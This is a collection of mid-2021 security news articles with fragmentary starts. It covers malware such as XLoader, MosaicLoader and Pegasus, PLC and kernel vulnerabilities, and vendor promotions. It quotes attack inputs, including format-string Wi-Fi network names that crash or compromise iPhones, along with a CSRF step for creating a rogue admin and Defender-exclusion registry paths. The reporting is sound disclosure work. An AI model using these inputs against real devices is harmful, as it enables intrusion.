gaps in relying on third-party code hosted on public package repositories as software supply chain attacks become a popular tactic for threat actors to abuse the trust in interconnected IT tools to stage increasingly sophisticated security breaches.\n“Growing popularity of software package repositories and their ease of use make them a perfect target,“ Zanki said. “When developers reuse existing libraries to implement the needed functionality faster and easier, they rarely make in-depth security assessments before including them into their project.“\n“This omission is a result of the overwhelming nature, and the vast quantity, of potential security issues found in third-party code. Hence in general, packages are quickly installed to validate whether they solve the problem and, if they don’t, move on to the alternative. This is a dangerous practice, and it can lead to incidental installation of malicious software,“ Zanki added.\nUpdate: The offending NPM package has now been pulled from the repository, with a GitHub spokesperson telling The Hacker News that “We removed the package in accordance with npm’s acceptable use policy regarding malware, as outlined in its Open-Source Terms.“\nVisiting the NPM page for “nodejs_net_server“ now displays the message “This package contained malicious code and was removed from the registry by the NPM security team.“\n\n\nFound this article interesting?

'text': 'A popular malware known for stealing sensitive information from Windows machines has evolved into a new strain capable of also targeting Apple’s macOS operating system.\nThe upgraded malware, dubbed “XLoader,“ is a successor to another well-known Windows-based info stealer called Formbook that’s known to vacuum credentials from various web browsers, capture screenshots, record keystrokes, and download and execute files from attacker-controlled domains.\n\n“For as low as $49 on the Darknet, hackers can buy licenses for the new malware, enabling capabilities to harvest log-in credentials, collect screenshots, log keystrokes, and execute malicious files,“ cybersecurity firm Check Point said in a report shared with The Hacker News.\nDistributed via spoofed emails containing malicious Microsoft Office documents, XLoader is estimated to infected victims spanning across 69 countries between December 1, 2020, and June 1, 2021, with 53% of the infections reported in the U.S. alone, followed by China’s special administrative regions (SAR), Mexico, Germany, and France.\nWhile the very first Formbook samples were detected in the wild in January 2016, sale of the malware on underground forums stopped in October 2017, only to be resurrected more than two years later in the form of XLoader in February 2020.\nIn October 2020, the latter was advertised for sale on the same forum which was used for selling Formbook, Check Point said. Both Formbook and its XLoader derivative are said to share the same codebase, with the new variant incorporating substantial changes that lend it new capabilities for compromising macOS systems.\n\nAccording to statistics released by Check Point earlier this January, Formbook was third among the most prevalent malware families in December 2020, impacting 4% of organizations worldwide. It’s worth noting that the newly discovered XLoader malware for PC and Mac is not the same as XLoader for Android, which was first detected in April 2019.\n\n“[XLoader] is far more mature and sophisticated than its predecessors, supporting different operating systems, specifically macOS computers,“ said Yaniv Balmas, head of cyber research at Check Point. “Historically, macOS malware hasn’t been that common. They usually fall into the category of ’spyware’, not causing too much damage.“\n“While there might be a gap between Windows and MacOS malware, the gap is slowly closing over time. The truth is that macOS malware is becoming bigger and more dangerous,“ Balmas noted, adding the findings “are a perfect example and confirm this growing trend.“\n\n\nFound this article interesting?

{'title': 'Several New Critical Flaws Affect CODESYS Industrial Automation Software',
'text': 'Cybersecurity researchers on Wednesday disclosed multiple security vulnerabilities impacting CODESYS automation software and the WAGO programmable logic controller (PLC) platform that could be remotely exploited to take control of a company’s cloud operational technology (OT) infrastructure.\nThe flaws can be turned “into innovative attacks that could put threat actors in position to remotely control a company’s cloud OT implementation, and threaten any industrial process managed from the cloud,“ the New York-headquartered industrial security company Claroty said in a report shared with The Hacker News, adding they “can be used to target a cloud-based management console from a compromised field device, or take over a company’s cloud and attack PLCs and other devices to disrupt operations.“\n\nCODESYS is a development environment for programming controller applications, enabling easy configuration of PLCs in industrial control systems. WAGO PFC100/200 is a series of PLCs that make use of the CODESYS platform for programming and configuring the controllers. \nThe list of seven vulnerabilities is listed below -\nCVE-2021-29238 (CVSS score: 8.0) - Cross-site request forgery in CODESYS Automation ServerCVE-2021-29240 (CVSS score: 7.8) - Insufficient Verification of Data Authenticity in CODESYS Package ManagerCVE-2021-29241 (CVSS score: 7.5) - Null pointer dereference in CODESYS V3 products containing the CmpGateway component\nCVE-2021-34569 (CVSS score: 10.0) - WAGO PFC diagnostic tools – Out-of-bounds writeCVE-2021-34566 (CVSS score: 9.1) - WAGO PFC iocheckd service “I/O-Check“ – Shared memory buffer overflow CVE-2021-34567 (CVSS score: 8.2) - WAGO PFC iocheckd service “I/O-Check“ – Out-of-bounds readCVE-2021-34568 (CVSS score: 7.5) - WAGO PFC iocheckd service “I/O-Check“ – Allocation of resources without limits\nSuccessful exploitation of the flaws could enable the installation of malicious CODESYS packages, result in a denial-of-service (DoS) condition, or lead to privilege escalation via execution of malicious JavaScript code, and worse, manipulation or complete disruption of the device.\n\nIn the wild, this could play out in one of two ways: “bottom-up“ or “top-down.“ The twin approaches mimic the paths an adversary is likely to take to either control a PLC endpoint in order to eventually compromise the cloud-based management console, or the reverse, commandeer the cloud in order to manipulate all networked field devices.\n\nIn a complex “bottom-up“ exploit chain devised by Claroty, a mix of CVE-2021-34566, CVE-2021-34567, and CVE-2021-29238 were exploited to obtain remote code execution on the WAGO PLC, only to gain access to the CODESYS WebVisu human-machine interface and stage a cross-site request forgery (CSRF) attack to seize control of the CODESYS automation server instance.\n\n“An attacker that obtains access to a PLC managed by the Automation Server Cloud can modify the ’webvisu.js’ file and append JavaScript code to the end of the file that will send a malicious request to the cloud server on behalf of the logged in user,“ Claroty senior researcher Uri Katz, who discovered and reported the flaws, explained.\n“When a cloud user views the WebVisu page, the modified JavaScript will exploit the lack of CSRF token and run in the context of the user viewing it; the request will include the CAS cookie. Attackers can use this to POST to ’/api/db/User’ with a new administrator user, giving them full access to the CODESYS cloud platform,“ Katz added.\nAn alternate “top-down“ attack scenario, on the other hand, involves compromising the CODESYS engineering station by deploying a malicious package (CVE-2021-29240) that’s designed to leak the cloud credentials associated with an operator account, and subsequently using it to tamper with the programmed logic and gain unfettered access to all the connected PLCs.\n\n“Organizations moving forward with cloud-based management of OT and ICS devices must be aware of the inherent risks, and increased threats from attackers keen on targeting industrial enterprises with extortion-based attacks—including ransomware—and more sophisticated attacks that can cause physical damage,“ Katz said.\nThe disclosures mark the second time critical flaws that have been uncovered in CODESYS and WAGO PLCs in as many months. In June, researchers from Positive Technologies revealed ten critical vulnerabilities in the software’s web server and runtime system components that could be abused to gain remote code execution on the PLCs.\nThe development also comes a week after IoT security firm Armis disclosed a critical authentication bypass vulnerability affecting Schneider Electric Modicon PLCs — dubbed “ModiPwn“ (CVE-2021-22779) — that could be exploited to allow full control over the PLC, including overwriting critical memory regions, leaking sensitive memory content, or invoking internal functions.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nIn a related report published earlier this May, Claroty made public a memory protection bypass vulnerability in Siemens SIMATIC S7-1200 and S7-1500 PLCs (CVE-2020-15782) that could be leveraged by a malicious actor to remotely gain access to protected areas of the memory and achieve unrestricted and undetected code execution.\nThe revelations also coincide with a joint cybersecurity advisory released by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) documenting a historical spear-phishing and intrusion campaign conducted by state-sponsored Chinese actors from December 2011 to 2013, targeting 23 oil and natural gas (ONG) pipeline operators in the country.\n“CISA and the FBI assess that these actors were specifically targeting U.S. pipeline infrastructure for the purpose of holding U.S. pipeline infrastructure at risk,“ the agencies said. “Additionally, CISA and the FBI assess that this activity was ultimately intended to help China develop cyberattack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.“\n\n\nFound this article interesting?

{'title': '[eBook] A Guide to Stress-Free Cybersecurity for Lean IT Security Teams',
'text': 'Today’s cybersecurity landscape is enough to make any security team concerned. The rapid evolution and increased danger of attack tactics have put even the largest corporations and governments at heightened risk. If the most elite security teams can’t prevent these attacks from happening, what can lean security teams look forward to? \nSurprisingly, leaner teams have a much greater chance than they think. It might seem counterintuitive, but recent history has shown that large numbers and huge budgets aren’t the difference-makers they once were. Indeed, having the right strategy in place is a clear indicator of an organization’s success today.\nA new guide by XDR provider Cynet (download it here) looks to dispel the myth that bigger is always better and shows a smarter way forward for lean IT security teams.\nThe new guide focuses on helping lean IT security teams plan strategies that can protect their organizations while reducing the level of stress they face. Due to the rise of cyber tools that can help level the playing field and a new generation of security professionals, smaller organizations can now defend their organizations equally. However, it’s not just about tools, but about how they’re deployed.\nThe guide signals six key components of stress-free cybersecurity: \nPreventionDetectionCorrelationInvestigationRemediation Oversight\nPutting the pieces together \nThe question is how organizations can put together these six components into a strategy that doesn’t just help them survive but stay ahead of potential threats and attackers. The guide argues that it begins with a combination of good planning and having the right tools in place.\n Instead of having to update security definitions manually and constantly being behind the eight-ball in terms of prevention, recent technologies such as next-generation antivirus (NGAV) software can give organizations greater visibility and help automate detection and initial response. This reduces the time it takes to get up to speed, and lets organizations be proactive. \nNext, adding a layer of detection tools such as endpoint detection and response (EDR) and network detection and response (NDR) offers a more comprehensive view of organizations’ environments. They also provide around-the-clock monitoring for every attack surface. More importantly, they help organizations cut down on the volume of alerts. \nHowever, even with fewer alerts, it’s still important to separate the noise from the real alarms. Older technologies don’t offer these capabilities and left massive blind spots because they weren’t collecting data from every potential source (files, users, networks, and hosts). Instead, they left security teams to put together the pieces as best they could. \nAdding correlation abilities with platforms such as extended detection and response (XDR) can help connect these dots and provide a much better picture of the threat landscape. Instead of having to put the pieces together manually, XDR tools can gather all the data from relevant sources and analyze it in a unified way, producing more actionable intelligence for better results. \nWith the ability to correlate data in hand, lean security teams can better investigate issues.\nHowever, even here, new tools are making the process easier and less stressful. For instance, new XDR tools offer automated investigation and response, which allows them to look not just at an incident, but at the sequence of events, alerts, and anomalous behavior that led to it.\nThis offers a much better path to the final step, remediation. Here again, automation offers much faster response times, better outcomes, and easier resolutions. More importantly, by adding things like fully integrated managed detection and response (MDR), organizations can focus on the critical tasks knowing that they have a team of experts supporting them. \nYou can learn more about how lean security teams can build stress-less security strategies here. \n\n\nFound this article interesting?

An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.\n\nSuccessful exploitation of the flaw, however, necessitates that the attacker already has a foothold and is in possession of the ability to execute code on the victim system. In the interim, the CERT/CC is recommending that users restrict access to sam, system, and security files and delete VSS shadow copies of the system drive.\nThe latest disclosure also marks the third publicly disclosed unpatched bug in Windows since the release of Patch Tuesday updates on July 13.

Remediations have been released for a security shortcoming affecting all Linux kernel versions from 2014 that can be exploited by malicious users and malware already deployed on a system to gain root-level privileges.\n\nDubbed “Sequoia“ by researchers from cybersecurity firm Qualys, the issue has been assigned the identifier CVE-2021-33909 and affects default installations of Ubuntu 20.04, Ubuntu 20.10, Ubuntu 21.04, Debian 11, and Fedora 34 Workstation. Red Hat Enterprise Linux versions 6, 7, and 8 are also affected by the vulnerability.\nSpecifically, the flaw concerns a size_t-to-int type conversion vulnerability in the Linux Kernel’s “seq_file“ file system interface, permitting an unprivileged local attacker to create, mount, and delete a deep directory structure whose total path length exceeds 1GB, resulting in privilege escalation on the vulnerable host.\nSeparately, Qualys also disclosed a stack exhaustion denial-of-service vulnerability in systemd (CVE-2021-33910) that could be exploited by unprivileged attackers to crash the software suite and trigger a kernel panic.\n\n\nFound this article interesting?

'text': 'Details have emerged about a high severity security vulnerability affecting a software driver used in HP, Xerox, and Samsung printers that has remained undetected since 2005.\nTracked as CVE-2021-3438 (CVSS score: 8.8), the issue concerns a buffer overflow in a print driver installer package named “SSPORT.SYS“ that can enable remote privilege and arbitrary code execution. Hundreds of millions of printers have been released worldwide to date with the vulnerable driver in question.\nHowever, there is no evidence that the flaw was abused in real-world attacks.\n\n“A potential buffer overflow in the software drivers for certain HP LaserJet products and Samsung product printers could lead to an escalation of privilege,“ according to an advisory published in May.\nThe issue was reported to HP by threat intelligence researchers from SentinelLabs on February 18, 2021, following which remedies have been published for the affected printers as of May 19, 2021.\n\nSpecifically, the issue hinges on the fact that the printer driver doesn’t sanitize the size of the user input, potentially allowing an unprivileged user to escalate privileges and run malicious code in kernel mode on systems that have the buggy driver installed. now\n“The vulnerable function inside the driver accepts data sent from User Mode via IOCTL (Input/Output Control) without validating the size parameter,“ SentinelOne researcher Asaf Amir said in a report shared with The Hacker News. “This function copies a string from the user input using ’strncpy’ with a size parameter that is controlled by the user. Essentially, this allows attackers to overrun the buffer used by the driver.“\n\nInterestingly, it appears that HP copied the driver’s functionality from a near-identical Windows driver sample published by Microsoft, although the sample project in itself doesn’t contain the vulnerability.\nThis is not the first time security flaws have been discovered in old software drivers.

{'title': 'This New Malware Hides Itself Among Windows Defender Exclusions to Evade Detection',
'text': 'Cybersecurity researchers on Tuesday lifted the lid on a previously undocumented malware strain dubbed “MosaicLoader“ that singles out individuals searching for cracked software as part of a global campaign.\n“The attackers behind MosaicLoader created a piece of malware that can deliver any payload on the system, making it potentially profitable as a delivery service,“ Bitdefender researchers said in a report shared with The Hacker News. “The malware arrives on target systems by posing as cracked installers. It downloads a malware sprayer that obtains a list of URLs from the C2 server and downloads the payloads from the received links.“\n\nThe malware has been so named because of its sophisticated internal structure that’s orchestrated to prevent reverse-engineering and evade analysis.\nAttacks involving MosaicLoader rely on a well-established tactic for malware delivery called search engine optimization (SEO) poisoning, wherein cybercriminals purchase ad slots in search engine results to boost their malicious links as top results when users search for terms related to pirated software.\n\nUpon a successful infection, the initial Delphi-based dropper — which masquerades as a software installer — acts as an entry point to fetch next-stage payloads from a remote server and also add local exclusions in Windows Defender for the two downloaded executables in an attempt to thwart antivirus scanning.\n\nIt’s worth pointing out that such Windows Defender exclusions can be found in the registry keys listed below:\nFile and folder exclusions - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\PathsFile type exclusions - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\ExtensionsProcess exclusions - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\nOne of the binaries, “appsetup.exe,“ is conceived to achieve persistence on the system, whereas the second executable, “prun.exe,“ functions as a downloader for a sprayer module that can retrieve and deploy a variety of threats from a list of URLs, ranging from cookie stealers to cryptocurrency miners, and even more advanced implants like Glupteba.\n\n“prun.exe“ is also notable for its barrage of obfuscation and anti-reverse techniques that involve separating code chunks with random filler bytes, with the execution flow designed to “jump over these parts and only execute the small, meaningful chunks.“\n\nGiven MosaicLoader’s wide-ranging capabilities, compromised systems can be co-opted into a botnet that the threat actor can then exploit to propagate multiple and evolving sets of sophisticated malware, including both publicly available and customized malware, to obtain, expand, and maintain unauthorized access to victim computers and networks.\n“The best way to defend against MosaicLoader is to avoid downloading cracked software from any source,“ the researchers said. “Besides being against the law, cybercriminals look to target and exploit users searching for illegal software,“ adding it’s essential to “check the source domain of every download to make sure that the files are legitimate.“\n\n\nFound this article interesting?

The U.K. government accused Beijing of a “pervasive pattern of hacking“ and “systemic cyber sabotage.“\n\nThe sweeping espionage campaign exploited four previously undiscovered vulnerabilities in Microsoft Exchange software and is believed to have hit at least 30,000 organizations in the U.S. and hundreds of thousands more worldwide. Microsoft identified the group behind the hack as a skilled government-backed actor operating out of China named Hafnium.\nCalling it “the most significant and widespread cyber intrusion against the U.K. and allies,“ the National Cyber Security Centre (NCSC) said the attack was highly likely to enable “acquiring personally identifiable information and intellectual property.“\nIn addition, the MSS was also outed as the party behind a series of malicious cyber activities tracked under the monikers “APT40“ and “APT31,“ with the U.K. attributing the groups for targeting maritime industries and naval defence contractors in the U.S. and Europe, and as well as for executing the attack on the Finnish parliament in 2020.\n\nAlso, on Monday, the U.S. Federal Bureau of Investigation (FBI), National Security Agency (NSA), and Cybersecurity and Infrastructure Security Agency (CISA) released a joint advisory listing over 50 tactics, techniques, and procedures employed by APT40 and other Chinese state-sponsored cyber actors.“It has been a few months since attackers exploited the Hafnium related bugs in Exchange to deploy ransomware, like DearCry and Black Kingdom,“ Mark Loman, director of engineering at Sophos, said in an emailed statement. “In general, to protect themselves, ransomware operators typically operate from the dark web, or via one or more compromised servers hosted in countries other than the physical location of the attackers. This makes attack attribution hard, but not impossible.“\nUS Indicts Members of APT 40 Chinese Hacking Group\nIn a related development, the U.S. Department of Justice (DoJ) pressed criminal charges against four MSS hackers belonging to the APT40 group concerning a multiyear campaign targeting foreign governments and entities in maritime, aviation, defense, education, and healthcare sectors in the least a dozen countries to facilitate the theft of trade secrets, intellectual property, and high-value information.\nSeparately, the NCSC also announced that a group known as “APT10“ acted on behalf of the MSS to carry out a sustained cyber campaign focused on large-scale service providers with the goal of seeking to gain access to commercial secrets and intellectual property data in Europe, Asia, and the U.S.\n\n“APT 10 has an enduring relationship with the Chinese Ministry of State Security, and operates to meet Chinese State requirements,“ the intelligence agency said.\nIn a press statement, the European Union urged Chinese authorities to take action against malicious cyber activities undertaken from its territory, stating the Microsoft Exchange server hacks resulted in security risks and significant economic loss for government institutions and private companies.\nThe Chinese government has repeatedly denied claims of state-sponsored intrusions. A spokesperson for the Chinese Embassy in Washington, according to the Associated Press, painted China as “a severe victim of the U.S. cyber theft, eavesdropping, and surveillance,“ noting that the “U.S. has repeatedly made groundless attacks and malicious smear against China on cybersecurity.“\n“The PRC has fostered an intelligence enterprise that includes contract hackers who also conduct unsanctioned cyber operations worldwide, including for their own personal profit,“ the White House said, adding “hackers with a history of working for the PRC Ministry of State Security (MSS) have engaged in ransomware attacks, cyber enabled extortion, cryptojacking, and rank theft from victims around the world, all for financial gain.“\nUpdate: Speaking at a press conference, Zhao Lijian, a spokesperson for the Chinese Ministry of Foreign Affairs, rejected accusations that Beijing was behind the global cyber hacking campaign targeting Microsoft Exchange servers and accused the U.S. of being the world’s largest source of attacks in cyberspace.\n“China firmly opposes and combats all forms of cyber attacks. It will never encourage, support or condone cyber attacks. This position has been consistent and clear,“ Lijian said. “Given the virtual nature of cyberspace and the fact that there are all kinds of online actors who are difficult to trace, it’s important to have enough evidence when investigating and identifying cyber-related incidents. It requires extra prudence when linking cyber attacks with the government of any country. The so-called technical details released by the U.S. side do not constitute a complete chain of evidence.“\n\n\nFound this article interesting?

{'title': 'Researchers Warn of Linux Cryptojacking Attackers Operating from Romania',
'text': 'A threat group likely based in Romania and active since at least 2020 has been behind an active cryptojacking campaign targeting Linux-based machines with a previously undocumented SSH brute-forcer written in Golang.\nDubbed “Diicot brute,“ the password cracking tool is alleged to be distributed via a software-as-a-service model, with each threat actor furnishing their own unique API keys to facilitate the intrusions, Bitdefender researchers said in a report published last week.\n\nWhile the goal of the campaign is to deploy Monero mining malware by remotely compromising the devices via brute-force attacks, the researchers connected the gang to at least two DDoS botnets, including a Demonbot variant called chernobyl and a Perl IRC bot, with the XMRig mining payload hosted on a domain named mexalz[.]us since February 2021.\n\nThe Romanian cybersecurity technology company said it began its investigation into the group’s hostile online activities in May 2021, leading to the subsequent discovery of the adversary’s attack infrastructure and toolkit.\nThe group is also known for relying on a bag of obfuscation tricks that enable them to slip under the radar. To that end, the Bash scripts are compiled with a shell script compiler (shc), and the attack chain has been found to leverage Discord to report the information back to a channel under their control, a technique that has become increasingly common among malicious actors for command-and-control communications and evade security.\n\nUsing Discord as a data exfiltration platform also absolves the need for threat actors to host their own command-and-control server, not to mention enabling support for creating communities centered around buying and selling malware source code and services.\n“Hackers going after weak SSH credentials is not uncommon,“ the researchers said. “Among the biggest problems in security are default user names and passwords, or weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it in a way that lets attackers go undetected.“\n\n\nFound this article interesting?

{'title': 'Turns Out That Low-Risk iOS Wi-Fi Naming Bug Can Hack iPhones Remotely',
'text': 'The Wi-Fi network name bug that was found to completely disable an iPhone’s networking functionality had remote code execution capabilities and was silently fixed by Apple earlier this year, according to new research.\nThe denial-of-service vulnerability, which came to light last month, stemmed from the way iOS handled string formats associated with the SSID input, triggering a crash on any up-to-date iPhone that connected to wireless access points with percent symbols in their names such as “%p%s%s%s%s%n.“\nWhile the issue is remediable by resetting the network settings (Settings > General > Reset > Reset Network Settings), Apple is expected to push a patch for the bug in its iOS 14.7 update, which is currently available to developers and public beta testers.\n\nBut in what could have had far-reaching consequences, researchers from mobile security automation firm ZecOps found that the same bug could be exploited to achieve remote code execution (RCE) on targeted devices by simply attaching the string pattern “%@“ to the Wi-Fi hotspot’s name.\n\nZecOps nicknamed the issue “WiFiDemon.“ It’s also a zero-click vulnerability in that it allows the threat actor to infect a device without requiring any user interaction, although it requires that the setting to automatically join Wi-Fi networks is enabled (which it is, by default).\n“As long as the Wi-Fi is turned on this vulnerability can be triggered,“ the researchers noted. “If the user is connected to an existing Wi-Fi network, an attacker can launch another attack to disconnect/de-associate the device and then launch this zero-click attack.“\n\n“This zero-click vulnerability is powerful: if the malicious access point has password protection and the user never joins the Wi-Fi, nothing will be saved to the disk,“ the company added. “After turning off the malicious access point, the user’s Wi-Fi function will be normal. A user could hardly notice if they have been attacked.“\nAll iOS versions starting with iOS 14.0 and prior to iOS 14.3 were found to be vulnerable to the RCE variant, with Apple “silently“ patching the issue in January 2021 as part of its iOS 14.4 update. No CVE identifier was assigned to the flaw.\nGiven the exploitable nature of the bug, it’s highly recommended that iPhone and iPad users update their devices to the latest iOS version to mitigate the risk associated with the vulnerability.\nUpdate: Apple has officially released iOS 14.7 and iPadOS 14.7 with bug fixes and security enhancements, which also comes with a patch for the Wi-Fi denial-of-service issue. In a security update document shared on Wednesday, the company said it addressed the flaw with “improved checks.“ The fix is available for iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation).\n\n\nFound this article interesting?

{'title': 'Five Critical Password Security Rules Your Employees Are Ignoring',
'text': 'According to Keeper Security’s Workplace Password Malpractice Report, many remote workers aren’t following best practices for password security.\nPassword security was a problem even before the advent of widespread remote work. So, what happened post-pandemic? Keeper Security’s Workplace Password Malpractice Report sought to find out.\nIn February 2021, Keeper surveyed 1,000 employees in the U.S. about their work-related password habits -- and discovered that a lot of remote workers are letting password security go by the wayside.\nHere are 5 critical password security rules they’re ignoring.\n1 — Always use strong passwords\nStrong passwords are at least eight characters long (preferably more) and consist of random strings of letters, numerals, and special characters. Passwords should never include dictionary words, which are easy to guess, or personal details, which cybercriminals can scrape off social media channels.\n37% of respondents to Keeper’s survey said they’ve used their employer’s name as part of their work-related passwords34% have used their significant other’s name or birthday31% have used their child’s name or birthday\n2 — Use a unique password for every account\nSome things should never be recycled -- like passwords. When employees reuse passwords across accounts, they greatly increase the risk that their employer will be breached.\nUnfortunately, 44% of respondents to Keeper’s survey admit to reusing passwords across personal and work accounts.\n3 — Store all passwords securely, with full encryption\nUsing a strong, unique password for every account is only a starting point. Employees also need to store their passwords securely. Keeper’s survey demonstrated that they’re not doing that:\n57% of respondents write down their passwords on sticky notes, and 62% write down their passwords in a notebook or journal, which anyone else living in or visiting the home can access.49% store their passwords in a document saved in the cloud, 51% use a document stored locally on their computer, and 55% save them on their phone. Because these documents aren’t encrypted, if a cybercriminal breaches the cloud drive, computer, or mobile phone, they can open the employee’s password file.\n4 — Never share work-related passwords with unauthorized parties\nWork passwords are confidential business information that employees should never share with anyone outside the organization, not even their spouses. Keeper’s survey revealed that 14% of remote workers have shared work-related passwords with a spouse or significant other, and 11% have shared them with other family members.\n5 — Password-sharing within the workplace is okay, but only if it’s done securely, with full end-to-end encryption\nShared passwords in the workplace can be done safely if employees share passwords using a secure method, and the passwords are shared only with authorized parties. However, Keeper’s survey discovered that 62% of respondents share passwords through unencrypted email or text messages, which can be intercepted in transit.\nKeeper helps organizations prevent workplace password malpractice\nKeeper’s enterprise-grade password security and encryption platform helps organizations prevent password malpractice -- and password-related cyberattacks -- by giving IT administrators complete visibility into employee password practices, as well as the ability to enforce password security rules company-wide.\nSeamlessly integrates into any IAM tech stack. Keeper integrates with Azure, AD, LDAP, and SSO, making it a critical part of any modern IAM strategy.Automatically generates strong, unique passwords. Keeper automatically generates strong, random, unique passwords for every account and app.Securely stores passwords in an encrypted digital vault. Each employee gets an encrypted digital vault that they can access from any device, running any operating system.Gives IT admins complete control over employee password behavior. Using the Keeper admin dashboard, security personnel can easily configure password security rules, such as length, complexity, and sharing capabilities.Enables secure password sharing. Sharing can only be done between authorized users, and Keeper’s zero-knowledge encryption methods ensure that only the user can access and decrypt their stored files. Records and files both at rest and in transit, are always encrypted.Provides your employees with a fringe benefit, at no additional cost. All protected users under a Keeper Business account get a free Keeper Family plan at no additional cost to your organization.\nPassword security is the foundation of cybersecurity, and it’s especially important in a remote work world. It’s impossible to secure your organization without first securing your employees’ passwords.\nKeeper deploys within minutes, is simple for all employees to use, and scales to the size of your organization. Sign up for a 14-day free trial of Keeper now, and start protecting your organization from password malpractice.\n\n\nFound this article interesting?

{'title': 'New Leak Reveals Abuse of Pegasus Spyware to Target Journalists Globally',
'text': 'A sweeping probe into a data leak of more than 50,000 phone numbers has revealed an extensive misuse of Israeli company NSO Group’s Pegasus “military-grade spyware“ to facilitate human rights violations by surveilling heads of state, activists, journalists, and lawyers around the world.\nDubbed the “Pegasus Project,“ the investigation is a collaboration by more than 80 journalists from a consortium of 17 media organizations in 10 countries coordinated by Forbidden Stories, a Paris-based media non-profit, along with the technical support of Amnesty International.\n“The Pegasus Project lays bare how NSO’s spyware is a weapon of choice for repressive governments seeking to silence journalists, attack activists and crush dissent, placing countless lives in peril,“ Amnesty International’s Secretary-General, Agnès Callamard, said.\n“These revelations blow apart any claims by NSO that such attacks are rare and down to rogue use of their technology. While the company claims its spyware is only used for legitimate criminal and terror investigations, it’s clear its technology facilitates systemic abuse. They paint a picture of legitimacy, while profiting from widespread human rights violations,“ Callamard added.\n\nNSO Group is the maker of a cyber-surveillance weapon called “Pegasus,“ which, when surreptitiously installed on victims’ iPhone and Android devices, enables an attacker to harvest emails, SMS messages, media, calendars, calls, and contact information, as well as chat content from messaging apps like WhatsApp, Telegram and Signal, and stealthily activate the phone’s microphone and camera.\nThe tool, which is sold by the surveillance vendor to governments worldwide, is typically installed by either exploiting previously unknown security vulnerabilities in common apps or by tricking a potential target into clicking a malicious link. NSO Group calls itself “the world leader in precision cyber intelligence solutions for the sole use of vetted-and-approved, state-administered intelligence and law enforcement agencies.“\nThe list of phone numbers, while not including the names, is said to contain hundreds of business executives, religious figures, academics, NGO employees, union officials, and government officials, with the probe uncovering NSO Group clients in at least 11 countries, including Azerbaijan, Bahrain, Hungary, India, Kazakhstan, Mexico, Morocco, Rwanda, Saudi Arabia, Togo, and the U.A.E.\nThe investigation has so far identified 180 journalists and more than 600 politicians and government officials, spanning across more than 50 countries, even as the timeline of the attacks spread over a seven-year period from 2014 up to as recently as July 2021. However, Rwanda, Morocco, India, and Hungary denied having used Pegasus to hack the phones of the individuals named in the list.\n\nTroublingly, a forensic analysis of 67 mobile devices showed the intrusions involved the ongoing use of so-called “zero-click“ exploits — which do not require any interaction from the target — dating all the way back to May 2018. In one instance highlighted by Amnesty International, the compromise is believed to have leveraged multiple zero-days in iMessage to attack a fully patched iPhone 12 running iOS 14.6 in July 2021.\n“All this indicates that NSO Group can break into the latest iPhones,“ Citizen Lab’s Bill Marczak said in a series of tweets. “It also indicates that Apple has a MAJOR blinking red five-alarm-fire problem with iMessage security that their BlastDoor Framework (introduced in iOS 14 to make zero-click exploitation more difficult) ain’t solving.“\n\nOf the tested smartphones, 23 devices had been successfully infected with Pegasus, and 15 exhibited signs of attempted penetration, the Washington Post said in an in-depth report.\n“The coming week’s stories about the global hacking of phones identical to the one in your pocket, by for-profit companies, make it clear that export controls have failed as a means to regulate this industry,“ U.S. whistleblower Edward Snowden tweeted. “Only a comprehensive moratorium on sales can remove the profit motive.“\nThis is far from the first time NSO Group’s phone-penetrating spy software has been used to target human rights activists and journalists. In October 2019, Facebook-owned WhatsApp revealed that at least two dozen academics, lawyers, Dalit activists, and journalists in India were the target of unlawful surveillance by taking advantage of a then-unpatched vulnerability in the messaging service.\nWhatsApp has since taken the company to court in the U.S., citing evidence that “the attackers used servers and Internet-hosting services that were previously associated with NSO.“\nFor its part, the Israeli company flatly disputed the allegations, stating it’s “full of wrong assumptions and uncorroborated theories that raise serious doubts about the reliability and interests of the sources,“ while stressing that it’s on a “life-saving mission“ to “break up pedophilia rings, sex and drug-trafficking rings, locate missing and kidnapped children, locate survivors trapped under collapsed buildings, and protect airspace against disruptive penetration by dangerous drones.“\n“After checking their claims, we firmly deny the false allegations made in their report,“ the company added. “Their sources have supplied them with information which has no factual basis, as evident by the lack of supporting documentation for many of their claims. In fact, these allegations are so outrageous and far from reality, that NSO is considering a defamation lawsuit.“\nThe latest development also comes days after another Israeli company called Candiru was outed as the commercial spyware vendor behind the exploitation of a number of zero-day flaws in Google Chrome and Microsoft Windows as part of a series of “precision attacks“ to hack more than 100 journalists, academics, activists, and political dissidents globally.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nUpdate: Amazon on Monday said it has cut off web hosting infrastructure and accounts linked to Israeli surveillance vendor NSO Group following a forensic investigation of the attacks that determined that a phone infected with NSO’s Pegasus malware sent information “to a service fronted by Amazon CloudFront, suggesting NSO Group has switched to using AWS services in recent months.“\nIn a related development, Amnesty International has published a Mobile Verification Toolkit (MVT) to help individuals scan their iPhone and Android devices for evidence of compromise. Apple, for its part, rolled out an update to iOS but has not yet released security details that could indicate whether it has fixed the exploits identified by Amnesty International.\n“Attacks like the ones described are highly sophisticated, cost millions of dollars to develop, often have a short shelf life, and are used to target specific individuals,“ Apple’s head of security engineering and architecture Ivan Kristic said in a statement. “While that means they are not a threat to the overwhelming majority of our users, we continue to work tirelessly to defend all our customers, and we are constantly adding new protections for their devices and data.“\n\n\nFound this article interesting?

